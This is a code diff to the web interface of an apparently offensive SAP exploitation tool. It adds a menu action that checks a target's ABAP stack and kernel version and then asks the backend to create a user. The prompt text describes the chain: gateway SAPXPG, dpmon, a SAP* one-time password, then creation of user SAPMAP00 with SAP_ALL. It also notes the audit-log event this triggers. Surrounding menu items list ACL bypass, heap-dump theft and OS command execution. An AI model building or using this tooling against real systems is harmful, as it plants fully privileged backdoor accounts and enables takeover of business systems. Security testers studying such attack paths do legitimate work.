@@ -819,6 +819,7 @@ body {
       <div class="ctx-item" data-action="icmad_acl_bypass">&#9889; ICMAD ACL Bypass Sweep (CVE-2022-22536)</div>
       <div class="ctx-item" data-action="icmad_heapdump_pull">&#128190; ICMAD &#8594; Pull Heap Dump (HPROF)</div>
       <div class="ctx-item" data-action="create_user_gw">&#128100; Create User (GW Exploit)</div>
+      <div class="ctx-item" data-action="create_user_dpmon_sapstar">&#9889; Create User (dpmon SAP*, kernel &ge; 790)</div>
       <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
       <div class="ctx-item" data-action="create_tcpip">&#128279; Create TCP/IP Dest (sapxpg)</div>
       <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
@@ -3495,6 +3496,7 @@ function showCtxMenu(e, sid) {
     'betrusted':             hasMsPort,              // need a known MS port
     'create_user_betrusted': hasMsVuln || hasGwVuln, // need vulnerable MS or GW
     'create_user_gw':   hasGwVuln,                  // need GW vulnerability
+    'create_user_dpmon_sapstar': hasGwVuln && isAbapStack && n.dpmon_sap_star_available,  // kernel>=790 + ABAP + GW
     'create_user_creds': hasCreds,                  // need credentials
     'lpe':              isAbapStack && hasCreds,    // ABAP-only (BAPI-driven)
     'check_linux_lpe':   !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
@@ -4575,6 +4577,43 @@ async function ctxAction(action) {
       );
       if (clientGw === null) break;
       await api('POST', `node/${sid}/create_user`, { method: 'gw_exploit', client: clientGw.trim() });
+      break;
+    }
+    case 'create_user_dpmon_sapstar': {
+      const n_dp = (mapState.nodes || {})[sid];
+      const sysTypeDp = (n_dp && n_dp.system_type || '').toUpperCase();
+      // Pre-flight: ABAP stack required (pure-Java has no SAP* user)
+      if (sysTypeDp.indexOf('ABAP') === -1) {
+        alert('dpmon virtual SAP* needs an ABAP stack.\n\n' +
+              'system_type=' + (n_dp && n_dp.system_type || '?') +
+              ' — try one of the Java exploit paths instead.');
+        break;
+      }
+      // Pre-flight: kernel >= 790
+      const kernelDp = (n_dp && n_dp.kernel || '').replace(/[^0-9]/g, '');
+      if (!kernelDp || parseInt(kernelDp.slice(0, 4), 10) < 790) {
+        alert('dpmon virtual SAP* needs kernel >= 790.\n\n' +
+              'This node reports kernel=' + (n_dp && n_dp.kernel || '?') +
+              ' — feature added in SAP Note 3303172.');
+        break;
+      }
+      const clients_dp = (n_dp && n_dp.clients || [])
+        .map(c => typeof c === 'object' ? c.nr || '?' : String(c));
+      const defClientDp = clients_dp.find(c => c !== '000') || clients_dp[0] || '001';
+      const clientDp = prompt(
+        `Create SAPMAP00 via dpmon virtual SAP* (kernel >= 790, ABAP):\n\n` +
+        (clients_dp.length > 0 ? `Known clients: ${clients_dp.join(', ')}\n` : '') +
+        `\nFlow: GW SAPXPG -> dpmon -> SAP* one-time password -> ` +
+        `BAPI_USER_CREATE1(SAPMAP00, SAP_ALL).\n\n` +
+        `Audit: this fires a Security Audit Log event EUP, purpose 2.\n\n` +
+        `Client?`,
+        defClientDp
+      );
+      if (clientDp === null) break;
+      await api('POST', `node/${sid}/create_user`, {
+        method: 'dpmon_sap_star',
+        client: clientDp.trim(),
+      });
       break;
     }
     case 'create_user_creds': {
